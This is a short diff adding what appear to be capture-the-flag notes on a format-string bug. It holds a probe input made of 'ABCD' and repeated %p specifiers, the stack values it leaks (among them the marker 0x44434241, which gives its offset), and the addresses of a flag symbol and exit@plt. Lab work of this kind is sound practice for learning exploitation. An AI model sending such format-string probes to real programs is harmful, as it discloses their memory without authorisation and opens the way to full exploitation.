@@ -1,0 +1,30 @@
+0804a060 <flag>:
+
+1234567890123456789012345678901234567 /echo:ABCD%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+ABCD_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p
+CD0xffa8b04c0x2e0xf76be3f0(nil)0xf77609380xffaa36f80x804917f0xffa8b04c0x804929d(nil)(nil)(nil)(nil)(nil)0x444342410x705f705f0x705f705f0x705f705f0x705f705f0x705f705f
+
+ABCD_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p_p
+ABCD
+0xfffa513c
+0x2d
+0xf76f23f0
+(nil)
+0xf7794938
+0xfffbd7e8
+0x804917f
+0xfffa513c
+0x804929d
+(nil)
+(nil)
+(nil)
+(nil)
+(nil)
+0x44434241
+0x705f705f
+0x705f705f
+0x705f705f
+0x705f705f
+0x705f705f
+
+08048650 <exit@plt>
